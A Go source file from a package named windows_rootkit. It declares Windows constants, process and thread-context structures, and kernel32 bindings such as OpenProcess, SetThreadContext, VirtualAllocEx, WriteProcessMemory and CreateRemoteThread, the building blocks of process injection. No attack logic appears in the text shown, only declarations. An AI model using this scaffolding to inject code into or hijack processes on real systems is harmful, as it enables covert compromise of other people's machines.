package windows_rootkit

import (
	"syscall"
)

// Constants for Windows API
const (
	PROCESS_QUERY_INFORMATION = 0x0400
	PROCESS_VM_READ           = 0x0010
	PROCESS_VM_WRITE          = 0x0020
	PROCESS_VM_OPERATION      = 0x0008
	TH32CS_SNAPPROCESS        = 0x00000002
	PROCESS_ALL_ACCESS        = 0x1F0FFF
	THREAD_SUSPEND_RESUME     = 0x2
	CONTEXT_FULL              = 0x10007
	CONTEXT_INTEGER           = 0x10002
	MEM_COMMIT                = 0x1000
	MEM_RESERVE               = 0x2000
	MEM_RELEASE               = 0x8000
	MEM_DECOMMIT              = 0x4000
)

// ProcessEntry32 structure representing a process in the snapshot
type ProcessEntry32 struct {
	Size            uint32
	Usage           uint32
	ProcessID       uint32
	DefaultHeapID   uintptr
	ModuleID        uint32
	Threads         uint32
	ParentProcessID uint32
	PriClassBase    int32
	Flags           uint32
	ExeFile         [syscall.MAX_PATH]uint16
}

// Context structure representing the context of a thread
type Context struct {
	ContextFlags                                                                 uint32
	Rax, Rbx, Rcx, Rdx                                                           uint64
	Rsi, Rdi, Rbp                                                                uint64
	Rsp, Rip                                                                     uint64
	R8, R9, R10, R11                                                             uint64
	R12, R13, R14, R15                                                           uint64
	Rflags                                                                       uint32
	SegCs, SegDs, SegEs, SegFs, SegGs, SegSs                                     uint16
	Dr0, Dr1, Dr2, Dr3, Dr6, Dr7                                                 uint64
	FloatSave                                                                    [512]byte
	VectorRegister                                                               [256]byte
	VectorControl, DebugControl                                                  uint64
	LastBranchToRip, LastBranchFromRip, LastExceptionToRip, LastExceptionFromRip uint64
}

// Functions from Windows API
var (
	Modkernel32 *syscall.LazyDLL = syscall.NewLazyDLL("kernel32.dll")
	kernel32DLL *syscall.LazyDLL = syscall.NewLazyDLL("kernel32.dll")

	ProcCreateToolhelp32Snapshot *syscall.LazyProc = Modkernel32.NewProc("CreateToolhelp32Snapshot")
	ProcProcess32First           *syscall.LazyProc = Modkernel32.NewProc("Process32First")
	ProcProcess32Next            *syscall.LazyProc = Modkernel32.NewProc("Process32Next")
	ProcOpenProcess              *syscall.LazyProc = Modkernel32.NewProc("OpenProcess")
	ProcSetProcessDescription    *syscall.LazyProc = Modkernel32.NewProc("SetProcessDescription")

	ProcOpenThread       *syscall.LazyProc = Modkernel32.NewProc("OpenThread")
	ProcSuspendThread    *syscall.LazyProc = Modkernel32.NewProc("SuspendThread")
	ProcResumeThread     *syscall.LazyProc = Modkernel32.NewProc("ResumeThread")
	ProcGetThreadContext *syscall.LazyProc = Modkernel32.NewProc("GetThreadContext")
	ProcSetThreadContext *syscall.LazyProc = Modkernel32.NewProc("SetThreadContext")
	VirtualAllocEx       *syscall.LazyProc = kernel32DLL.NewProc("VirtualAllocEx")
	WriteProcessMemory   *syscall.LazyProc = kernel32DLL.NewProc("WriteProcessMemory")
	CreateRemoteThread   *syscall.LazyProc = kernel32DLL.NewProc("CreateRemoteThread")
)
